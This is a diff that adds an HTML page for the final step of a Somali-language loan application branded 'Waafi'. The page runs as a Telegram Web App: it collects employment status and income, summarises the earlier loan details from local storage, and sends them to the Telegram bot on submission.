@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="so">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Codsiga Amaahda - Step 3</title>
+
+    <!-- FIXED Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f8f9fa;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .nav-header {
+            width: 100%;
+            background: linear-gradient(90deg, #a4e433 0%, #4caf50 100%);
+            padding: 15px 20px;
+            color: white;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-sizing: border-box;
+        }
+
+        .back-link { font-size: 22px; font-weight: 500; cursor: pointer; }
+        .waafi-logo { font-size: 24px; font-weight: bold; }
+
+        .form-card {
+            background: white;
+            width: 92%;
+            max-width: 480px;
+            margin-top: 25px;
+            padding: 30px 20px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.05);
+            box-sizing: border-box;
+        }
+
+        h2 {
+            text-align: center;
+            margin: 0;
+            font-size: 26px;
+            color: #333;
+            font-weight: 600;
+        }
+
+        .step-info {
+            text-align: center;
+            font-size: 15px;
+            color: #888;
+            margin: 10px 0 25px;
+        }
+
+        .progress-box {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 35px;
+        }
+
+        .bar {
+            height: 4px;
+            flex: 1;
+            background: #e0e0e0;
+            border-radius: 2px;
+        }
+
+        .active-bar {
+            background: #82d13d;
+        }
+
+        .input-wrap {
+            margin-bottom: 22px;
+        }
+
+        label {
+            display: block;
+            font-size: 16px;
+            font-weight: 500;
+            margin-bottom: 10px;
+            color: #333;
+        }
+
+        select, input {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid #d1d1d1;
+            border-radius: 8px;
+            font-size: 17px;
+            box-sizing: border-box;
+        }
+
+        .summary-box {
+            background-color: #f9f9f9;
+            border-left: 4px solid #82d13d;
+            padding: 20px;
+            border-radius: 6px;
+            margin: 25px 0;
+        }
+
+        .summary-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            border-bottom: 1px solid #eee;
+            padding-bottom: 8px;
+        }
+
+        .summary-label { color: #666; }
+        .summary-value { font-weight: 600; }
+
+        .btn-container {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .back-btn {
+            background-color: #f1f1f1;
+            color: #777;
+            border: 1px solid #ddd;
+            padding: 16px;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .submit-btn {
+            background: linear-gradient(90deg, #a4e433 0%, #7dbd27 100%);
+            color: white;
+            border: none;
+            padding: 18px;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .footer-text {
+            text-align: center;
+            font-size: 13px;
+            color: #aaa;
+            margin: 40px 0 30px;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="nav-header">
+    <div class="back-link" onclick="goBack()">← Dib u noqo</div>
+    <div class="waafi-logo">Waafi</div>
+    <div style="font-size: 26px;">☰</div>
+</div>
+
+<div class="form-card">
+    <h2>Codsiga Amaahda</h2>
+    <p class="step-info">Tallaabada 3 ee 3</p>
+
+    <div class="progress-box">
+        <div class="bar active-bar"></div>
+        <div class="bar active-bar"></div>
+        <div class="bar active-bar"></div>
+    </div>
+
+    <div class="input-wrap">
+        <label>Xaaladda Shaqada</label>
+        <select id="jobStatus">
+            <option>Shaqaale</option>
+            <option>Ganacsade</option>
+            <option>Arday</option>
+            <option>Shaqo la'aan</option>
+            <option>Hawlgab</option>
+        </select>
+    </div>
+
+    <div class="input-wrap">
+        <label>Dakhliga Sanadka ($)</label>
+        <input type="text" id="income" placeholder="25,000">
+    </div>
+
+    <div class="summary-box">
+        <div class="summary-item">
+            <span class="summary-label">Qaddarka:</span>
+            <span class="summary-value" id="sumAmount">--</span>
+        </div>
+        <div class="summary-item">
+            <span class="summary-label">Muddada:</span>
+            <span class="summary-value" id="sumDuration">--</span>
+        </div>
+        <div class="summary-item">
+            <span class="summary-label">Ujeedada:</span>
+            <span class="summary-value" id="sumPurpose">--</span>
+        </div>
+        <div class="summary-item">
+            <span class="summary-label">Magaca:</span>
+            <span class="summary-value" id="sumName">--</span>
+        </div>
+    </div>
+
+    <div class="btn-container">
+        <button class="back-btn" onclick="goBack()">KA HORE</button>
+        <button class="submit-btn" onclick="submitForm()">DIR CODSIGA</button>
+    </div>
+</div>
+
+<div class="footer-text">© 2025 Waafi Soomaaliya</div>
+
+<script>
+    window.onload = () => {
+        const amount = localStorage.getItem('amount') || "1000";
+        const duration = localStorage.getItem('loanDuration') || "12 Bilood";
+        const purpose = localStorage.getItem('loanPurpose') || "N/A";
+        const fName = localStorage.getItem('firstName') || "";
+        const lName = localStorage.getItem('lastName') || "";
+
+        document.getElementById('sumAmount').innerText = `$${amount}`;
+        document.getElementById('sumDuration').innerText = duration;
+        document.getElementById('sumPurpose').innerText = purpose;
+        document.getElementById('sumName').innerText = `${fName} ${lName}`.trim();
+
+        const tg = window.Telegram?.WebApp;
+        if (tg) {
+            tg.ready();
+            tg.expand();
+        }
+    };
+
+    function submitForm() {
+        const tg = window.Telegram?.WebApp;
+
+        const data = {
+            amount: localStorage.getItem('amount'),
+            duration: localStorage.getItem('loanDuration'),
+            purpose: localStorage.getItem('loanPurpose'),
+            firstName: localStorage.getItem('firstName'),
+            lastName: localStorage.getItem('lastName'),
+            jobStatus: document.getElementById('jobStatus').value,
+            income: document.getElementById('income').value
+        };
+
+        if (!tg) {
+            alert("Telegram WebApp not detected");
+            return;
+        }
+
+        tg.sendData(JSON.stringify(data));
+        tg.close();
+
+        localStorage.clear();
+    }
+
+    function goBack() {
+        window.history.back();
+    }
+</script>
+
+</body>
+  </html>
